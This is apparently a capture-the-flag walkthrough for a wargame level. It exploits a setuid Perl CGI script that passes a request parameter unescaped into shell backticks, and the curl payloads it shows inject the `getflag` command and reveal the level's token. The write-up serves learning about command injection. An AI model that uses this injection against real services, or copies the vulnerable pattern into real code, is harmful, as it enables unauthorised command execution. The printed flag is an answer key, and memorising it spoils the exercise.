Let's inspect home directory:
```
ls -la
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

Again a file owned by a target user :)

Let's inspect it:
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

So it's a Perl script... with a system call!

Also we see a comment `localhost:4747`.
Let's try to make request on this address:
```
curl http://localhost:4747
```

We see an empty line.
That means script is working.

The scipt has takes a param `x`.

Let's try to use it in our request:
```
curl http://localhost:4747?x=hello
hello
```

Now I'll try to use grave accent (\`) to execute shell commands:
```
curl http://localhost:4747?x=`getflag`
```

This doesn't work.
Let's try to escape the grave accents:
```
curl http://localhost:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Done!

**Resources**
https://www.perl.com/pub/2000/10/begperl1.html/
https://stackoverflow.com/questions/40934882/in-perl-what-is-the-difference-between-double-quotes-single-quotes-and-gr